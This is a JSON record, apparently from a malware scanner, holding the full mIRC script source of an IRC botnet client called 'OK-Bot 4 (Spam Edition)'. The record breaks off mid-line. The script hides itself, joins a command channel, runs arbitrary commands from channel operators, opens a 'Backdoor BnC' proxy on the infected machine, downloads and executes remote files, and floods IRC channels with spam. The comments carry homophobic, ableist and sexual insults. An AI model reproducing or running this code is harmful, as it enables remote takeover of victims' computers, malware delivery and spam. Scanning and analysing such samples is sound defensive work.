{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "call": "May call a DLL using Excel 4 Macros",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "[script]\nn0=;OK-Bot 4 ((cigicigi) Spam Edition), by Fyle\nn1=\nn2=;If you are reading this then you are an elite hacker\nn3=;who has hacked and 0wned us. please come to whichever\nn4=;server and channel that you find in this bot and\nn5=;threaten to call isps and pretend that you have some sort\nn6=;of authority regarding what other people are allowed to\nn7=;do and say online and on their computers and tell us\nn8=;that you have our IPs and that various government\nn9=;agencies will soon be knocking down our doors unless we\nn10=;comply with your whims. We enjoy it, we keep logs of all\nn11=;of it and we sit around just laughing and laughing and\nn12=;laughing over the silly antics of people who think\nn13=;they have \"hacked\" something because they saw a\nn14=;server and channel in an ini file.\nn15=;Also, in order to save keystrokes, let me just say that\nn16=;1. Anatoly, warmode, Jackal, Fyle, berdan, mqm \nn17=;and all other script kiddies are bad and lame.\nn18=;Fyle is especially lame, and doesn't know how to code\nn19=;anything good. His code is bad, he is lame, and he probably\nn20=;has a small penis and talks like a girl. Did you see that\nn21=;shitty exe he made in VB and dropped on the GT bots?\nn22=;loooooooooool that is soooo lame. lame lame lame lame\nn23=;lame lololololol. oh god, what a fucking lamer hahahahha\nn24=;2.GT bots are lame. They have a big file size and mhide.exe\nn25=;doesn't work all the time. They can be opened up by anyone\nn26=;who figures out where they are and the goings-on of the\nn27=;botnet owner and his devious cohorts can be watched and\nn28=;documented. This is bad, but Fyle is too stupid to understand\nn29=;this and so has been \"hacked\" and \"0wned\" by you, the person\nn30=;reading this now.\nn31=;3. fcastle is totally gay for Fyle\nn32=;4. anything that doesn't exploit an undocumented vulnerability,\nn33=;have every concievable feature and ability, isn't written in\nn34=;assembly, isn't polymorphic and doesn't have a filesize < 1 kb\nn35=;is totally lame, and the person that made it must be completely\nn36=;retarded. Let us call this the \"I-don't-understand-\nn37=;anything-and-have-never-written-a-line-of-code-in-my-life-\nn38=;but-a-website-told-me-to-think-certain-things-about-certain-\nn39=;behaviors-and-other-people-are-lame-but-i-am-elite\"\nn40=;mor\ufffd principle of this sub-sub-counter culture of internet \nn41=;addicts, shall we? And now, more lameness...\nn42=\nn43=on *:start: {\nn44=  if (%bnc_connection_total == $null) { %bnc_connection_total = 0 }\nn45=  if (%dropped == $null) { %dropped = $fulldate }\nn46=  if (%spam_total == $null) { %spam_total = 0 }\nn47=  if ($appstate != hidden) { exit }\nn48=  if (%starts == $null) { %starts = 0 }\nn49=  %verbose = 0\nn50=  nick $rnick\nn51=  anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\nn52=  emailaddr $rnick $+ @ $+ $rnick $+ .com\nn53=  fullname $rnick\nn54=  ident_start\nn55=  .timer -o 0 60 keep_alive\nn56=  .timer -o 0 1 clearall\nn57=\nn58=;THIS IS THE SERVER THAT THE GT BOTS CONNECT TO.\nn59=;COME HERE AND TELL US THAT WE ARE LAME AND THAT THIS\nn60=;BOT SUCKS. LAAAAAAME WE ARE LAME LAME LAME HAHAHAHA\nn61=\nn62=  server irc.ircdmaster.com\nn63=  inc %starts\nn64=}\nn65=alias keep_alive {\nn66=  if ($status == disconnected) {\nn67=    nick $rnick\nn68=    anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\nn69=    server irc.ircdmaster.com\nn70=  }\nn71=  ident_start\nn72=}\nn73=\nn74=alias rnick { return $read(names.txt,$r(1,$lines(names.txt))) }\nn75=\nn76=on *:connect: {\nn77=  ident_start\nn78=\nn79=;THIS IS THE CHANNEL THAT THE GT BOTS JOIN AFTER THEY\nn80=;LOG ONTO THE SERVER. COME HERE TO SEE WHAT WE ARE UP\nn81=;TO AND TO KEEP TABS ON HOW MANY BOTS WE HAVE. KEEP LOGS\nn82=;OF THE CHANNEL TO USE WHEN YOU SEND THREATENING E-MAILS\nn83=;TO THE ISPS OF THE BNC'S WE ARE USING.\nn84=\nn85=  %chan = #spambots\nn86=  join %chan entry\nn87=}\nn88=raw 332:*: {\nn89=  if ($1 == $me) && ($2 == %chan) && ($3 == quiet) && ($4 == setspam:) {\nn90=    ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))   \nn91=    set %spam_message $5-\nn92=    msg %chan \u000312Starting spambot in QUIET mode\nn93=    msg %chan \u000313Spam message set to: \u00031,0 %spam_message\nn94=    invite\nn95=    .timerinvite -o 0 5 invite\nn96=    %verbose = 0\nn97=  }\nn98=  if ($1 == $me) && ($2 == %chan) && ($3 == verbose) && ($4 == setspam:) {\nn99=    ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))    \nn100=    set %spam_message $5-\nn101=    msg %chan \u000312Starting spambot in VERBOSE mode\nn102=    msg %chan \u000313Spam message set to: \u00031,0 %spam_message\nn103=    invite\nn104=    .timerinvite -o 0 5 invite\nn105=    %verbose = 1\nn106=  }\nn107=  if ($3 == OFF) && ($2 == %chan) {\nn108=    ;nick [OFF] $+ $mid($me,$calc($pos($me,])+1))\nn109=  }\nn110=  if ($2 == %chan) && ($3 != verbose) && ($3 != quiet) {\nn111=    ;nick [IDLE] $+ $mid($me,$calc($pos($me,])+1))\nn112=  }\nn113=}\nn114=\nn115=;********* CHANNEL COMMANDS **********\nn116=alias start_spam {\nn117=  if (%verbose == 1) {\nn118=    msg %chan \u000312Starting spambot in VERBOSE mode\nn119=  }\nn120=  if (%verbose == 0) {\nn121=    msg %chan \u000312Starting spambot in QUIET mode\nn122=  }\nn123=}\nn124=alias spam_off {\nn125=  ;nick [OFF] $+ $mid($me,$calc($pos($me,])+1))\nn126=  msg %chan \u00036Killed spambot\nn127=  .timers off\nn128=  .timer -o 0 60 keep_alive\nn129=  .timer -o 0 1 clearall\nn130=  sockclose spam\nn131=}\nn132=alias spam_on {\nn133=  start_spam\nn134=  ;nick [ON] $+ $mid($me,$calc($pos($me,])+1))\nn135=  invite\nn136=  .timerinvite -o 0 5 invite\nn137=}\nn138=alias spam_set {\nn139=  set %spam_message $1-\nn140=  if (%verbose == 1) {\nn141=    msg %chan \u000313Spam message set to:\u00031,0 %spam_message\nn142=  }\nn143=}\nn144=alias verbose_on {\nn145=  %verbose = 1\nn146=  msg %chan \u000312Bot is in VERBOSE mode\nn147=}\nn148=alias verbose_off {\nn149=  %verbose = 0\nn150=}\nn151=on *:text:*:*: {\nn152=\nn153=;THESE ARE ALL OF THE BOT COMMANDS. OMFG HOW LAME.\nn154=\nn155=  if ($nick isop %chan) {\nn156=\nn157=    if ($1 == ok:) { $2- }\nn158=    if ($1 == $1) { clearall }\nn159=    if ($1 == ok) && ($2 == $me $+ :) { $3- }\nn160=    if ($1 == $me) && ($2 == ok:) { $3- }\nn161=    if ($1 == reply:) { .timer 1 0 reply $2- }\nn162=    if ($1 == bnc:) { bnc_start $2 $nick }\nn163=    if ($1 == $me) && ($2 == bnc:) { bnc_start $3 $nick }\nn164=    if ($1 == bnc) && ($2 == $me $+ :) { bnc_start $3 $nick }\nn165=    if ($1 == $me) && ($2 == reply:) { .timer 1 0 reply $3- }\nn166=    if ($1 == $me) && ($2 == bnc:) { bnc_start $3 $nick }\nn167=    if ($1 == $me) && ($2 == download:) { download $3 }\nn168=\nn169=    if ($1 == setspam:) { spam_set $2- }\nn170=    if ($1 == spamset:) { spam_set $2- }\nn171=    if ($1 == $me) && ($2 == setspam:) { spam_set $3- }\nn172=    if ($1 == $me) && ($2 == spamset:) { spam_set $3- }\nn173=    if ($2 == $me $+ :) && ($1 == setspam:) { spam_set $3- }\nn174=    if ($2 == $me $+ :) && ($1 == spamset:) { spam_set $3- }\nn175=\nn176=    if ($1 == startspam:) { spam_on }\nn177=    if ($1 == spamstart:) { spam_on }\nn178=    if ($1 == $me) && ($2 == spamstart:) { spam_on }\nn179=    if ($1 == $me) && ($2 == startspam:) { spam_on }\nn180=    if ($2 == $me $+ :) && ($1 == startspam) { spam_on }\nn181=    if ($2 == $me $+ :) && ($1 == spamstart) { spam_on }\nn182=\nn183=    if ($1 == spamstop:) { spam_off }\nn184=    if ($1 == stopspam:) { spam_off }\nn185=    if ($1 == $me) && ($2 == stopspam:) { spam_off }\nn186=    if ($1 == $me) && ($2 == spamstop:) { spam_off }\nn187=    if ($2 == $me $+ :) && ($1 == stopspam) { spam_off }\nn188=    if ($2 == $me $+ :) && ($1 == spamstop) { spam_off }\nn189=\nn190=    if ($1 == quiet) { verbose_off }\nn191=    if ($1 == quiet:) { verbose_off }\nn192=    if ($1 == verbose) { verbose_on }\nn193=    if ($1 == verbose:) { verbose_on }\nn194=    if ($1 == $me) && ($2 == quiet:) { verbose_off }\nn195=    if ($1 == $me) && ($2 == verbose:) { verbose_on }\nn196=    if ($1 == quiet) && ($2 == $me $+ :) { verbose_off }\nn197=    if ($1 == verbose) && ($2 == $me $+ :) { verbose_on }\nn198=  }\nn199=}\nn200=on *:text:*:?: {\nn201=  if ($nick != Anatoly) {\nn202=    msg Anatoly \u000312[ $+ $nick $+ ] Msg'd me\u00031,0: $1-\nn203=    ignore -u3 $nick\nn204=  }\nn205=}\nn206=\nn207=alias reply { msg %chan $1- }\nn208=\nn209=;****** CLONE SOCKETS *******\nn210=\nn211=on *:sockopen:clone*: {\nn212=  if ($sock($sockname).status == active) { \nn213=    %identd_bind = $sock($sockname).bindport\nn214=    sockwrite -n $sockname NICK $rnick\nn215=    sockwrite -n $sockname USER $rnick \"\" \" $+ $rnick $+ \" : $+ $rnick\nn216=    msg %chan \u00034[ $sockname ] \u0002\u00033Connected  \nn217=  } \nn218=  if ($sock(ident).status != listening) {\nn219=    if ($portfree(113) == $true) {\nn220=      socklisten ident 113\nn221=    }\nn222=  }\nn223=}\nn224=on *:sockread:clone*: {\nn225=  if ($sockerr > 0) return\nn226=  :clone\nn227=  sockread %clone\nn228=  if ($sockbr == 0) { return }\nn229=  if (%clone == $null) { %clone = - }\nn230=  if ($gettok(%clone,1,32) == ping) {\nn231=    sockwrite -n $sockname PONG $gettok($gettok(%clone,2,32),1,58)\nn232=  }\nn233=  if ($gettok(%clone,2,32) == 433) {\nn234=    sockwrite -n $sockname NICK $rnick\nn235=  }\nn236=  if ($gettok(%clone,2,32) == 422) || ($gettok(%clone,2,32) == 376) {\nn237=    msg %chan \u00034[ $sockname ] \u0002\u000312Logged in\nn238=  }\nn239=  %n = $gettok($gettok(%clone,1,33),1,58)\nn240=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :\u0001PING) {\nn241=    sockwrite -n $sockname NOTICE %n :\u0001PING $gettok(%clone,5,32)\nn242=  }\nn243=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :\u0001VERSION\u0001) {\nn244=    sockwrite -n $sockname NOTICE %n :\u0001VERSION mIRC v6.03 Khaled Mardam-Bey\u0001\nn245=  }\nn246=  if ($gettok(%clone,2,32) == PRIVMSG) && ($gettok(%clone,4,32) == :\u0001TIME\u0001) {\nn247=    sockwrite -n $sockname NOTICE %n :\u0001TIME $fulldate $+ \u0001\nn248=  }\nn249=  unset %n\nn250=  goto clone\nn251=}\nn252=on *:sockclose:clone*: {\nn253=  msg %chan \u00034[ $sockname ] \u0002\u00036Terminated\nn254=}\nn255=;*************** IDENTd *************\nn256=\nn257=on *:socklisten:ident: { \nn258=  sockaccept ident_ $+ $r(0,9999999999) \nn259=}\nn260=on *:sockread:ident*: { \nn261=  sockread %ident\nn262=  sockwrite -n $sockname %identd_bind $+ , 6667 : USERID: $rnick : $rnick \nn263=  sockclose $sockname\nn264=}\nn265=alias ident_start {\nn266=  if ($portfree(113) == $true) {\nn267=    socklisten ident 113\nn268=  }\nn269=}\nn270=\nn271=;******************* BnC *****************\nn272=\nn273=alias bnc_start {\nn274=  if ($portfree($1) != $true) {\nn275=    notice $2 \u000312[BnC] \u00036Port $1 in use\nn276=  }\nn277=  if ($portfree($1) == $true) {\nn278=    sockclose bnc_listen\nn279=    socklisten bnc_listen $1\nn280=    if (%bnc_status != dead) {\nn281=      notice $2 \u000312[BnC Listening] \u00034/server -m $ip $sock(bnc_listen).port \u00037[ %bnc_connection_total ]\nn282=    }\nn283=    if (%bnc_status == dead) {\nn284=      sockclose bnc_listen\nn285=      notice $2 \u00036[BnC Dead]\nn286=    }\nn287=  }\nn288=}\nn289=on *:socklisten:bnc_listen: { \nn290=  %bnc_tmp = bnc_client_ $+ $ticks\nn291=  sockaccept %bnc_tmp\nn292=  sockwrite -n %bnc_tmp :x 002 :\u00033Welcome to Backdoor BnC by Fyle\nn293=  sockwrite -n %bnc_tmp :x 002 :\u00033Use /con <server> [port] to connect\nn294=  sockwrite -n %bnc_tmp :x 002 :\u00033Currently $sock(bnc_server_*,0) BnC users online\nn295=  s_rename \nn296=}\nn297=alias s_rename { \nn298=  if ($sock(bnc_client_ $+ $sock(%bnc_tmp).ip).status == Active) { \nn299=    sockwrite -n %bnc_tmp :x 002 :\u00033One connection per IP\nn300=    sockclose %bnc_tmp\nn301=    return \nn302=  }\nn303=  sockrename %bnc_tmp bnc_client_ $+ $sock(%bnc_tmp).ip \nn304=}\nn305=on *:sockread:bnc_client*: { \nn306=  if ($sockerr > 0) { return }\nn307=  :next\nn308=  sockread %client\nn309=  if ($sockbr == 0) { return }\nn310=  if ($gettok(%client,1,32) == NICK) {\nn311=    hadd -m $sockname 1 $gettok(%client,2,32)\nn312=  }\nn313=  if ($gettok(%client,1,32) == USER) {\nn314=    hadd -m $sockname 2 $gettok(%client,2-,32)\nn315=  }\nn316=  if ($gettok(%client,1,32) == CON) {\nn317=    if ($gettok(%client,2,32) != $null) {\nn318=      if ($gettok(%client,3,32) != $null) {\nn319=        if (. isin $gettok(%client,2,32)) {\nn320=          if ($gettok(%client,3,32) isnum 1-65535) { \nn321=            if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status == active) {\nn322=              sockwrite -n $sockname :x 002 :\u00033Terminating connection to $sock(bnc_server_ $+ $gettok($sockname,3,95)).ip\nn323=              sockclose bnc_server_ $+ $gettok($sockname,3,95)\nn324=            }\nn325=            sockwrite -n $sockname :x 002 :\u00033Attempting connection to $gettok(%client,2-,32)\nn326=            sockopen bnc_server_ $+ $sock($sockname).ip $gettok(%client,2-,32)\nn327=            return \nn328=          } \nn329=        } \nn330=      } \nn331=    } \nn332=  }\nn333=  if ($sock(bnc_server_ $+ $gettok($sockname,3,95)).status != Active) { \nn334=    return \nn335=  }\nn336=  sockwrite -n bnc_server_ $+ $gettok($sockname,3,95) %client\nn337=  inc %bnc_bytes $calc($len(%client) * 2)\nn338=  goto next \nn339=}\nn340=on *:sockopen:bnc_server_*: { \nn341=  if ($sock($sockname).status == Active) {\nn342=    %identd_bind = $sock($sockname).bindport\nn343=    sockwrite -n $sockname NICK $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),1)\nn344=    sockwrite -n $sockname USER $hget($sock(bnc_client_ $+ $gettok($sockname,3,95)),2)\nn345=    inc %bnc_connection_total\nn346=  } \nn347=}\nn348=on *:sockread:bnc_server_*: { \nn349=  if ($sockerr > 0) { return }\nn350=  :next\nn351=  sockread %server\nn352=  if ($sockbr == 0) { return }\nn353=  if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status != Active) { return }\nn354=  sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) %server\nn355=  inc %bnc_bytes $calc($len(%server) * 2)\nn356=  goto next \nn357=}\nn358=on *:sockclose:bnc_server_*: {\nn359=  if ($sock(bnc_client_ $+ $gettok($sockname,3,95)).status == active) {\nn360=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :\u00033Connection to $sock($sockname).ip $sock($sockname).port closed\nn361=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :\u00033Welcome to Backdoor BnC by Fyle\nn362=    sockwrite -n bnc_client_ $+ $gettok($sockname,3,95) :x 002 :\u00033Use /con <server> [port] to connect\nn363=  }\nn364=}\nn365=on *:sockclose:bnc_client_*: {\nn366=  sockclose bnc_server_ $+ $gettok($sockname,3,95)\nn367=}\nn368=\nn369=;****** WEB DOWNLOADER ******\nn370=\nn371=alias download {\nn372=  if ($1 == $null) {\nn373=    msg %chan \u0002Usage\u0002: download <http://www.domain.com/file.name> [file size]\nn374=    halt\nn375=    return\nn376=  }\nn377=  if ($sock(download).status != $null) {\nn378=    msg %chan \u0002Download\u0002: download socket busy, ignoring command\nn379=    halt\nn380=    return\nn381=  }\nn382=  if ($left($1,7) != http://) || ($chr(46) !isin $gettok($1,2,47)) {\nn383=    msg %chan \u0002Usage\u0002: download <http://www.domain.com/file.name> [file size]\nn384=    halt\nn385=    return\nn386=  }\nn387=  if ($left($1,7) == http://) && ($chr(46) isin $gettok($1,2,47)) {\nn388=    if ($gettok($1,3-,47) == $null) {\nn389=      msg %chan \u0002Download Halted\u0002: No file to request\nn390=      halt\nn391=      return\nn392=    }\nn393=    hadd -m download 1 $gettok($1,2,47)\nn394=    hadd -m download 2 $gettok($1,3-,47)\nn395=    hadd -m download 3 $gettok($1,$numtok($1,47),47)\nn396=    sockclose download\nn397=    sockopen download $hget(download,1) 80\nn398=  }\nn399=}\nn400=on *:sockopen:download: {\nn401=  unset %chk\nn402=  if ($sock(download).status == active) {\nn403=    sockwrite -n download GET / $+ $hget(download,2) HTTP/1.1\nn404=    sockwrite -n download Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\nn405=    sockwrite -n download Accept-Language: en-us\nn406=    sockwrite -n download Accept-Encoding: identity\nn407=    sockwrite -n download Host: $hget(download,1)\nn408=    sockwrite download $crlf\nn409=  }\nn410=  if ($sock(download).status != active) {\nn411=    msg %chan \u0002Download Failed\u0002: Could not connect to $hget(download,1)\nn412=    sockclose download\nn413=    return\nn414=  }\nn415=}\nn416=on *:sockread:download: {  \nn417=  if (%chk == $null) { \nn418=    sockread %download\nn419=    if ($gettok(%download,1,32) == Content-length:) {\nn420=      hadd -m download 4 $gettok(%download,2,32)\nn421=      if ($exists($mircdir $+ download\\ $+ $hget(download,3)) == $true) {\nn422=        if ($file($mircdir $+ download\\ $+ $hget(download,3)).size == $hget(download,4)) {\nn423=          msg %chan \u0002Download Halted\u0002: I already have that file\nn424=          sockclose download\nn425=          halt\nn426=          return \nn427=        }\nn428=        if ($file($mircdir $+ download\\ $+ $hget(download,3)).size != $hget(download,4)) {\nn429=          .remove \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \"\nn430=        }\nn431=      }\nn432=    }\nn433=    if ($gettok(%download,1,32) == HTTP/1.1) {\nn434=      if ($gettok(%download,2,32) == 200) {\nn435=        msg %chan \u0002Download\u0002: $gettok(%download,2-,32)\nn436=      }\nn437=      if ($left($gettok(%download,2,32),1) == 1) {\nn438=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn439=        sockclose download\nn440=        halt\nn441=        return\nn442=      }\nn443=      if ($gettok(%download,2,32) == 201) {\nn444=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn445=        sockclose download\nn446=        halt\nn447=        return\nn448=      }\nn449=      if ($gettok(%download,2,32) == 202) {\nn450=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn451=        sockclose download\nn452=        halt\nn453=        return\nn454=      }\nn455=      if ($gettok(%download,2,32) == 203) {\nn456=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn457=        sockclose download\nn458=        halt\nn459=        return\nn460=      }\nn461=      if ($gettok(%download,2,32) == 204) {\nn462=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn463=        sockclose download\nn464=        halt\nn465=        return\nn466=      }\nn467=      if ($gettok(%download,2,32) == 205) {\nn468=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn469=        sockclose download\nn470=        halt\nn471=        return\nn472=      }\nn473=      if ($gettok(%download,2,32) == 206) {\nn474=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn475=        sockclose download\nn476=        halt\nn477=        return\nn478=      }\nn479=      if ($left($gettok(%download,2,32),1) == 3) {\nn480=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn481=        sockclose download\nn482=        halt\nn483=        return\nn484=      }\nn485=      if ($left($gettok(%download,2,32),1) == 4) {\nn486=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn487=        sockclose download\nn488=        halt\nn489=        return\nn490=      }\nn491=      if ($left($gettok(%download,2,32),1) == 5) {\nn492=        msg %chan \u0002Download Failed\u0002: $gettok(%download,2-,32)\nn493=        sockclose download\nn494=        halt\nn495=        return\nn496=      }\nn497=    }\nn498=    if ($len(%download) < 4) {\nn499=      %chk = 1\nn500=    }\nn501=    halt\nn502=  }\nn503=  :download\nn504=  sockread &download\nn505=  if ($sockbr == 0) { return } \nn506=  bwrite \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \" -1 &download\nn507=  goto download\nn508=}\nn509=on *:sockclose:download: { \nn510=  if ($hget(download,4) == $file($mircdir $+ download\\ $+ $hget(download,3)).size) {\nn511=    msg %chan \u0002Download Ended\u0002 Expected Filesize \u00032[ $hget(download,4) ] \u00031,0Actual Filesize: \u00033[ $file($mircdir $+ download\\ $+ $hget(download,3)).size ] \u00031,0Result: \u00034[ Success ] ( $+ \u000312Ran $mircdir $+ download\\ $+ $hget(download,3) $+ \u00031,0)\nn512=    run \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \"\nn513=    halt\nn514=    return    \nn515=  }\nn516=  if ($hget(download,4) != $file($mircdir $+ download\\ $+ $hget(download,3)).size) {\nn517=    msg %chan \u0002Download Ended\u0002 Expected Filesize \u00032[ $hget(download,4) ] \u00031,0Actual Filesize: \u00033[ $file($mircdir $+ download\\ $+ $hget(download,3)).size ] \u00031,0Result: \u00034[ Failed ]\nn518=  }\nn519=}\nn520=\nn521=;******* Spam Bot ********\nn522=\nn523=alias invite {\nn524=  if ($portfree(113) == $true) { socklisten ident 113 }\nn525=  if ($sock(spam).status == $null) {\nn526=    %spam_server = $read(servers.txt)\nn527=    if (%verbose == 1) {\nn528=      msg %chan \u00035Attempting connection to %spam_server $+ ...\nn529=    }\nn530=    sockopen spam %spam_server 6667 \nn531=  }\nn532=}\nn533=on *:sockclose:spam: {\nn534=  if (%verbose == 1) {\nn535=    msg %chan \u00036Disconnected from server\nn536=    msg %chan \u00036Moving to next random server...\nn537=  }\nn538=  invite\nn539=}\nn540=on *:sockopen:spam: {\nn541=  if ($portfree(113) == $true) {\nn542=    start_ident\nn543=  }\nn544=  if ($sock(spam).status == active) {\nn545=    write -c channels.txt\nn546=    write -c users.txt\nn547=    sockwrite -n spam NICK $rnick\nn548=    sockwrite -n spam USER $rnick \"\" \" $+ %spam_server $+ \" : $+ $r(a,z) $+ $r(a,z) $+ $rnick $+ $r(a,z) $+ $r(a,z) $+ $rnick\nn549=    if (%verbose == 1) {    \nn550=      msg %chan \u00033Connected to %spam_server\nn551=    }\nn552=  }\nn553=  timerlogin -o 1 60 login_timeout\nn554=}\nn555=alias login_timeout {\nn556=  if ($sock(spam).status != $null) {\nn557=    if (%verbose == 1) {\nn558=      msg %chan \u000312Login timed out!\nn559=      msg %chan \u00036Moving to next random server...\nn560=    }\nn561=    sockclose spam\nn562=    invite\nn563=  }\nn564=}\nn565=on *:sockread:spam: {\nn566=  if ($sockerr > 0) { return }\nn567=  :spam\nn568=  if ($sock(spam).status == active) {\nn569=    sockread %spam\nn570=  }\nn571=  if ($sockbr == 0) { return }\nn572=  if (%spam == $null) { %spam = - }\nn573=  if ($gettok(%spam,1,32) == PING) { \nn574=    sockwrite -n $sockname PONG $gettok($gettok(%spam,2,32),1,58)\nn575=  }\nn576=  %n = $gettok($gettok(%spam,1,33),1,58)\nn577=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :\u0001PING) {\nn578=    sockwrite -n $sockname NOTICE %n :\u0001PING $gettok(%spam,5,32)\nn579=  }\nn580=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :\u0001VERSION\u0001) {\nn581=    sockwrite -n $sockname NOTICE %n :\u0001VERSION mIRC v6.03 Khaled Mardam-Bey\u0001\nn582=  }\nn583=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :\u0001TIME\u0001) {\nn584=    sockwrite -n $sockname NOTICE %n :\u0001TIME $fulldate $+ \u0001\nn585=  }\nn586=  ;433 = Nick already in use\nn587=  if ($gettok(%spam,2,32) == 433) {\nn588=    sockwrite -n spam NICK $rnick $+ $r(a,z) $+ $r(a,z)\nn589=  }\nn590=  ;376 = End of MOTD command\nn591=  if ($gettok(%spam,2,32) == 376) {\nn592=    timerlogin off\nn593=    sockwrite -n $sockname LIST >2,<10000\nn594=    %chaninc = 0\nn595=    if (%verbose == 1) {\nn596=      msg %chan \u000312Logged into %spam_server $+ , getting channel list\nn597=    }\nn598=  }\nn599=  ;422 = MOTD missing\nn600=  if ($gettok(%spam,2,32) == 422) {\nn601=    timerlogin off\nn602=    sockwrite -n $sockname LIST >2,<10000\nn603=    %chaninc = 0\nn604=    if (%verbose == 1) {\nn605=      msg %chan \u000312Logged into %spam_server\nn606=    }\nn607=  }\nn608=  ;263 = Server load too heavy\nn609=  if ($gettok(%spam,2,32) == 263) {\nn610=    if (%verbose == 1) {\nn611=      msg %chan \u00036Server load to heavy, moving to next server...\nn612=    }    \nn613=    sockclose spam\nn614=    invite\nn615=  }\nn616=  ;321 Channel list began\nn617=  if ($gettok(%spam,2,32) == 263) {\nn618=    if (%verbose == 1) {\nn619=      msg %chan \u000312Getting channel list...\nn620=    }\nn621=  }\nn622=  ;322 A channel in the list\nn623=  if ($gettok(%spam,2,32) == 322) {\nn624=    if ($left($gettok(%spam,4,32),1) == $chr(35)) {\nn625=      if (op !isin $gettok(%spam,4,32)) && (help !isin $gettok(%spam,4,32)) && (line !isin $gettok(%spam,4,32)) {\nn626=        write channels.txt $gettok(%spam,4,32)\nn627=      }\nn628=    }\nn629=  }\nn630=  ;323 Channel list ended\nn631=  if ($gettok(%spam,2,32) == 323) || ($gettok(%spam,4-,32) == :End of /LIST) {\nn632=    %chan_inc = 1\nn633=    sockwrite -n spam join $read(channels.txt,%chan_inc)\nn634=    if (%verbose == 1) {\nn635=      msg %chan \u00034Finished getting channels\nn636=    }  \nn637=  }\nn638=  ;332 Channel topic recieved (joined channel)\nn639=  if ($gettok(%spam,2,32) == 332) {\nn640=    if (%verbose == 1) {\nn641=      msg %chan \u000312Joined $read(channels.txt,%chan_inc)\nn642=    }\nn643=    write -c users.txt\nn644=  }\nn645=  ;471 Can't join, Channel full\nn646=  if ($gettok(%spam,2,32) == 471) {\nn647=    if (%verbose == 1) {\nn648=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , channel full\nn649=    }    \nn650=    .timer 1 5 next_chan\nn651=    return\nn652=  }\nn653=  ;477 Can't join, Channel full\nn654=  if ($gettok(%spam,2,32) == 477) {\nn655=    if (%verbose == 1) {\nn656=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , channel full\nn657=    }    \nn658=    .timer 1 5 next_chan\nn659=    return\nn660=  }\nn661=  if ($gettok(%spam,2,32) == 478) {\nn662=    if (%verbose == 1) {\nn663=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , channel ban/ignore list full\nn664=    }    \nn665=    .timer 1 5 next_chan\nn666=    return\nn667=  }\nn668=  if ($gettok(%spam,2,32) == 481) {\nn669=    if (%verbose == 1) {\nn670=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , IRCops only\nn671=    }    \nn672=    .timer 1 5 next_chan\nn673=    return\nn674=  }\nn675=  if ($gettok(%spam,2,32) == 482) {\nn676=    if (%verbose == 1) {\nn677=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , IRCops only\nn678=    }    \nn679=    .timer 1 5 next_chan\nn680=    return\nn681=  }\nn682=  ;473 Can't join, Invite only\nn683=  if ($gettok(%spam,2,32) == 473) {\nn684=    if (%verbose == 1) {\nn685=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , invite only   \nn686=    }       \nn687=    .timer 1 5 next_chan\nn688=    return\nn689=  }\nn690=  ;474 Can't join, Banned\nn691=  if ($gettok(%spam,2,32) == 474) {\nn692=    if (%verbose == 1) {\nn693=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , banned\nn694=    }    \nn695=    .timer 1 5 next_chan\nn696=    return\nn697=  }\nn698=  ;475 Can't join, Key\nn699=  if ($gettok(%spam,2,32) == 475) {\nn700=    if (%verbose == 1) {\nn701=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , need correct key\nn702=    }    \nn703=    .timer 1 5 next_chan\nn704=    return\nn705=  }\nn706=  ;412 Can't join, Banned\nn707=  if ($gettok(%spam,2,32) == 412) {\nn708=    if (%verbose == 1) {\nn709=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , banned\nn710=    }    \nn711=    .timer 1 5 next_chan\nn712=    return\nn713=  }\nn714=  ;461 Can't join, Banned\nn715=  if ($gettok(%spam,2,32) == 461) {\nn716=    if (%verbose == 1) {\nn717=      msg %chan \u000312Couldn't join $read(channels.txt,%chan_inc) $+ , banned\nn718=    }    \nn719=    .timer 1 5 next_chan\nn720=    return\nn721=  }\nn722=  ;490 Can't join, need to identify to nickserv\nn723=  if ($gettok(%spam,2,32) == 439) {\nn724=    if (%verbose == 1) 